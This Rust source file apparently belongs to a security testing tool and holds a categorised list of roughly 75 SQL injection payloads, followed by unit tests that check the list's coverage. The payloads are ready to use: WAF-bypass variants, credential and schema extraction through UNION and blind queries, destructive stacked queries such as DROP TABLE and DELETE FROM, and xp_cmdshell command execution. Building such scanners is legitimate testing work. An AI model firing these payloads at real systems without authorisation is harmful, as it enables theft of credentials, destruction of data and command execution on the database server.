use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Sqli,
        "basic", [
            ("'", "Single quote injection", Severity::High),
            ("\"", "Double quote injection", Severity::High),
            ("`", "Backtick injection", Severity::High),
            ("\\'", "Escaped single quote", Severity::Medium),
            ("\\\"", "Escaped double quote", Severity::Medium),
        ];
        "error-based", [
            ("' OR '1'='1", "Classic OR bypass", Severity::Critical),
            ("\" OR \"1\"=\"1", "Double quote OR bypass", Severity::Critical),
            ("' OR '1'='1'--", "OR bypass with comment", Severity::Critical),
            ("' OR '1'='1'/*", "OR bypass with block comment", Severity::Critical),
            ("1' OR '1' = '1", "Numeric context OR", Severity::Critical),
            ("1 OR 1=1", "Numeric OR no quotes", Severity::Critical),
            ("' OR ''='", "Empty string comparison", Severity::High),
            ("' OR 1=1--", "Simple OR with comment", Severity::Critical),
            (") OR ('1'='1", "Parenthesis OR", Severity::High),
            ("')) OR 1=1--", "Double parenthesis OR", Severity::High),
        ];
        "union-based", [
            ("' UNION SELECT NULL--", "UNION NULL test", Severity::Critical),
            ("' UNION SELECT NULL,NULL--", "UNION 2 columns", Severity::Critical),
            ("' UNION SELECT NULL,NULL,NULL--", "UNION 3 columns", Severity::Critical),
            ("' UNION SELECT 1,2,3--", "UNION numeric columns", Severity::Critical),
            ("' UNION SELECT username,password FROM users--", "UNION credential extraction", Severity::Critical),
            ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "UNION schema enumeration", Severity::Critical),
            ("' UNION SELECT column_name,NULL FROM information_schema.columns--", "UNION column enumeration", Severity::Critical),
            ("' UNION ALL SELECT NULL--", "UNION ALL variant", Severity::Critical),
            ("1 UNION SELECT * FROM users", "UNION without quote", Severity::Critical),
        ];
        "time-based", [
            ("' AND SLEEP(5)--", "MySQL SLEEP injection", Severity::Critical),
            ("' AND BENCHMARK(10000000,SHA1('test'))--", "MySQL BENCHMARK", Severity::Critical),
            ("'; WAITFOR DELAY '0:0:5'--", "SQL Server WAITFOR", Severity::Critical),
            ("' AND pg_sleep(5)--", "PostgreSQL pg_sleep", Severity::Critical),
            ("' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--", "MySQL nested SLEEP", Severity::Critical),
            ("1; WAITFOR DELAY '0:0:5'--", "SQL Server stacked WAITFOR", Severity::Critical),
            ("'||pg_sleep(5)||'", "PostgreSQL concatenation sleep", Severity::Critical),
        ];
        "stacked-queries", [
            ("'; DROP TABLE users--", "DROP TABLE injection", Severity::Critical),
            ("'; DELETE FROM users--", "DELETE injection", Severity::Critical),
            ("'; INSERT INTO users VALUES(1,'hacker','pwned')--", "INSERT injection", Severity::Critical),
            ("'; UPDATE users SET password='hacked'--", "UPDATE injection", Severity::Critical),
            ("'; EXEC xp_cmdshell('dir')--", "SQL Server command exec", Severity::Critical),
            ("'; CREATE TABLE hacked(id INT)--", "CREATE TABLE injection", Severity::Critical),
        ];
        "waf-bypass", [
            ("'/**/OR/**/1=1--", "Comment bypass OR", Severity::Critical),
            ("'/*!50000OR*/1=1--", "MySQL version comment bypass", Severity::Critical),
            ("' oR '1'='1", "Case variation bypass", Severity::High),
            ("'\tO\tR\t'1'='1", "Tab bypass", Severity::High),
            ("'%0aOR%0a'1'='1", "Newline bypass", Severity::High),
            ("'\toR\t'1'='1", "Mixed whitespace bypass", Severity::High),
            ("'/**/'OR'/**/'1'='1", "Comment separation bypass", Severity::High),
            ("1'oorr'1'='1", "Double keyword bypass", Severity::Medium),
            ("' UN%ION SELECT NULL--", "URL encoded keyword", Severity::High),
            ("' UN//ION SELECT NULL--", "Double slash bypass", Severity::High),
            ("' UNION/**/SELECT NULL--", "Comment in keyword", Severity::High),
            ("'uNiOn'sElEcT'null--", "Quote separation bypass", Severity::Medium),
            ("'-UNION-SELECT-null--", "Dash separation bypass", Severity::Medium),
        ];
        "encoded", [
            ("%27%20OR%201%3D1--", "URL encoded OR injection", Severity::High),
            ("%27%20UNION%20SELECT%20NULL--", "URL encoded UNION", Severity::High),
            ("%2527%20OR%201%3D1--", "Double URL encoded", Severity::High),
            ("%%2727%%2727", "Double encoding bypass", Severity::Medium),
            ("%u0027%u004f%u0052", "Unicode encoding", Severity::Medium),
            ("%EF%BF%BD%27", "Invalid UTF-8 sequence", Severity::Medium),
        ];
        "db-specific", [
            ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "SQL Server CONVERT", Severity::High),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "MySQL EXTRACTVALUE", Severity::High),
            ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--", "MySQL UPDATEXML", Severity::High),
            ("' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "MySQL GROUP BY error", Severity::High),
            ("' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)--", "PostgreSQL CASE error", Severity::High),
            ("'||UTL_INADDR.get_host_address((SELECT password FROM users WHERE rownum=1))||'", "Oracle UTL_INADDR", Severity::Critical),
            ("'||ctxsys.drithsx.sn(1,(SELECT password FROM users WHERE rownum=1))||'", "Oracle DRITHSX", Severity::Critical),
        ];
        "boolean-blind", [
            ("' AND 1=1--", "Boolean true", Severity::High),
            ("' AND 1=2--", "Boolean false", Severity::High),
            ("' AND SUBSTRING((SELECT database()),1,1)='a'--", "Database name extraction", Severity::Critical),
            ("' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--", "Character-by-character extraction", Severity::Critical),
            ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "Table existence check", Severity::High),
            ("' AND LENGTH((SELECT database()))>5--", "Length check", Severity::High),
            ("' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'--", "Table name extraction", Severity::Critical),
            ("' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--", "Conditional boolean", Severity::High),
        ];
        "sqlite", [
            ("' UNION SELECT sql FROM sqlite_master--", "Schema extraction", Severity::Critical),
            ("' UNION SELECT name FROM sqlite_master WHERE type='table'--", "Table enumeration", Severity::Critical),
            ("' UNION SELECT name FROM pragma_table_info('users')--", "Column enumeration", Severity::Critical),
            ("' AND type='table' AND name NOT LIKE 'sqlite_%'--", "Table filtering", Severity::High),
            ("' UNION SELECT * FROM users LIMIT 1 OFFSET 0--", "Row extraction", Severity::Critical),
            ("' AND (SELECT total_changes())>0--", "Change detection", Severity::Medium),
        ];
        "ms-access", [
            ("' UNION SELECT * FROM MSysObjects--", "MSysObjects table", Severity::Critical),
            ("' UNION SELECT * FROM [MSysObjects] WHERE Type=1--", "Table listing", Severity::Critical),
            ("' AND (SELECT COUNT(*) FROM MSysObjects)>0--", "Object count", Severity::High),
            ("' AND IIF(1=1,'true','false')='true'--", "IIF injection", Severity::High),
            ("' UNION SELECT * FROM admin--", "Admin table guess", Severity::Critical),
        ];
    );

    // Add "blind" tag to time-based payloads
    for p in &mut payloads {
        if p.tags.contains(&"time-based".to_string()) && !p.tags.contains(&"blind".to_string()) {
            p.tags.push("blind".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn error_based_payloads_are_critical() {
        let payloads = get_payloads();
        let error_based: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"error-based".to_string()))
            .collect();
        assert!(!error_based.is_empty(), "Must have error-based payloads");
        let critical_count = error_based
            .iter()
            .filter(|p| p.severity == Severity::Critical)
            .count();
        assert!(
            critical_count >= error_based.len() / 2,
            "Most error-based payloads should be Critical"
        );
    }

    #[test]
    fn all_payloads_are_sqli_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Sqli);
        }
    }

    #[test]
    fn contains_or_bypass_patterns() {
        let payloads = get_payloads();
        let has_or = payloads
            .iter()
            .any(|p| p.payload.contains("OR") || p.payload.contains("or"));
        assert!(has_or, "Must contain OR-based bypass payloads");
    }

    #[test]
    fn contains_union_select() {
        let payloads = get_payloads();
        let has_union = payloads
            .iter()
            .any(|p| p.payload.to_uppercase().contains("UNION SELECT"));
        assert!(has_union, "Must contain UNION SELECT payloads");
    }

    #[test]
    fn contains_sql_comments() {
        let payloads = get_payloads();
        let has_comment = payloads
            .iter()
            .any(|p| p.payload.contains("--") || p.payload.contains("/*"));
        assert!(has_comment, "Must contain SQL comment (-- or /*) payloads");
    }

    #[test]
    fn contains_dangerous_statements() {
        let payloads = get_payloads();
        let upper: Vec<String> = payloads.iter().map(|p| p.payload.to_uppercase()).collect();
        assert!(
            upper.iter().any(|p| p.contains("DROP TABLE")),
            "Must contain DROP TABLE"
        );
        assert!(
            upper.iter().any(|p| p.contains("DELETE FROM")),
            "Must contain DELETE FROM"
        );
    }

    #[test]
    fn contains_time_based_blind() {
        let payloads = get_payloads();
        let has_sleep = payloads.iter().any(|p| {
            p.payload.contains("SLEEP")
                || p.payload.contains("pg_sleep")
                || p.payload.contains("WAITFOR")
        });
        assert!(
            has_sleep,
            "Must contain time-based blind payloads (SLEEP, WAITFOR)"
        );
    }

    #[test]
    fn waf_bypass_payloads_exist() {
        let payloads = get_payloads();
        let waf: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"waf-bypass".to_string()))
            .collect();
        assert!(waf.len() >= 5, "Must have at least 5 WAF bypass payloads");
    }

    #[test]
    fn stacked_queries_contain_semicolon() {
        let payloads = get_payloads();
        let stacked: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"stacked-queries".to_string()))
            .collect();
        assert!(!stacked.is_empty(), "Must have stacked query payloads");
        for p in stacked {
            assert!(
                p.payload.contains(';'),
                "Stacked query payloads must contain semicolon"
            );
        }
    }

    #[test]
    fn contains_information_schema_enumeration() {
        let payloads = get_payloads();
        let has_info_schema = payloads
            .iter()
            .any(|p| p.payload.contains("information_schema"));
        assert!(
            has_info_schema,
            "Must contain information_schema enumeration payloads"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 60,
            "Must have substantial SQLi payload coverage, got {}",
            payloads.len()
        );
    }
}
